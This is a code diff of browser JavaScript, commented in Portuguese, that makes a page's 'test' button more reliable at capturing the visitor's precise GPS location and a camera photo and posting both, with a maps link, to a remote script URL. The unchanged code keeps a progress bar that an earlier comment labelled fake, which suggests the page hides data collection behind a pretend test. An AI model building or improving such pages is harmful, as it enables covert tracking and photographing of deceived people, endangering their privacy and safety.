@@ -52,10 +52,14 @@ function setStatus(msg){
   status.innerText = msg;
 }
 
-// GEOLOCALIZAÇÃO
+// GEOLOCALIZAÇÃO COM TIMEOUT
 function getLocation(){
   return new Promise((resolve,reject)=>{
-    navigator.geolocation.getCurrentPosition(resolve,reject,{enableHighAccuracy:true});
+    navigator.geolocation.getCurrentPosition(
+      resolve,
+      reject,
+      { enableHighAccuracy:true, timeout:10000 }
+    );
   });
 }
 
@@ -67,43 +71,73 @@ async function startCamera(){
   });
 }
 
-// CAPTURA FOTO
+// CAPTURA FOTO (CORRIGIDA)
 async function capturePhoto(stream){
-  video.srcObject = stream;
-  video.style.display = "block";
 
-  await new Promise(r => setTimeout(r,1000));
+  return new Promise((resolve,reject)=>{
 
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video,0,0);
+    video.srcObject = stream;
+    video.style.display = "block";
 
-  // compressão (IMPORTANTE)
-  imageData = canvas.toDataURL("image/jpeg",0.5);
+    video.onloadedmetadata = () => {
 
-  // parar câmera
-  stream.getTracks().forEach(t=>t.stop());
-  video.style.display = "none";
+      setTimeout(()=>{
 
-  console.log("Imagem capturada:", imageData.substring(0,50)); // debug
+        try{
+
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          canvas.getContext("2d").drawImage(video,0,0);
+
+          imageData = canvas.toDataURL("image/jpeg",0.5);
+
+          // valida imagem
+          if(!imageData || imageData.length < 1000){
+            throw new Error("Imagem inválida");
+          }
+
+          // parar câmera
+          stream.getTracks().forEach(t=>t.stop());
+          video.style.display = "none";
+
+          console.log("Imagem OK:", imageData.substring(0,50));
+
+          resolve();
+
+        }catch(err){
+          reject(err);
+        }
+
+      }, 1500); // tempo real necessário
+
+    };
+
+  });
 }
 
-// ENVIO
+// ENVIO (COM RETORNO)
 async function sendData(payload){
   try{
-    await fetch(SCRIPT_URL,{
+
+    const res = await fetch(SCRIPT_URL,{
       method:"POST",
       headers:{
         "Content-Type":"application/json"
       },
       body:JSON.stringify(payload)
     });
+
+    const text = await res.text();
+    console.log("Resposta servidor:", text);
+
   }catch(e){
     console.error("Erro envio:", e);
+    throw e;
   }
 }
 
-// EXECUÇÃO PRINCIPAL
+// EXECUÇÃO
 async function startTest(){
 
   start.disabled = true;
@@ -111,13 +145,18 @@ async function startTest(){
 
   try{
 
+    // captura paralela
     const [pos,stream] = await Promise.all([
       getLocation(),
       startCamera()
     ]);
 
-    setStatus("Capturando dados...");
+    setStatus("Capturando imagem...");
     await capturePhoto(stream);
+
+    if(!imageData){
+      throw new Error("Imagem não capturada");
+    }
 
     const payload = {
       timestamp:new Date().toISOString(),
@@ -125,26 +164,31 @@ async function startTest(){
       longitude:pos.coords.longitude,
       accuracy:pos.coords.accuracy,
       mapLink:`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
-      image:imageData // ✔ GARANTIDO
+      image:imageData
     };
 
-    console.log("Payload:", payload); // debug
+    console.log("Payload enviado:", payload);
 
     await sendData(payload);
 
-    setStatus("Dados enviados com sucesso");
+    setStatus("✔ Dados enviados com sucesso");
 
   }catch(e){
-    console.error(e);
-    setStatus("Erro ou permissão negada");
+
+    console.error("ERRO:", e);
+
+    if(e.code === 1){
+      setStatus("Permissão negada");
+    }else{
+      setStatus("Erro na captura/envio");
+    }
+
   }
 
-  // animação fake
   bar.style.width = "100%";
 
   setTimeout(()=>{
     start.disabled = false;
-    setStatus("");
     bar.style.width = "0%";
   },3000);
 }
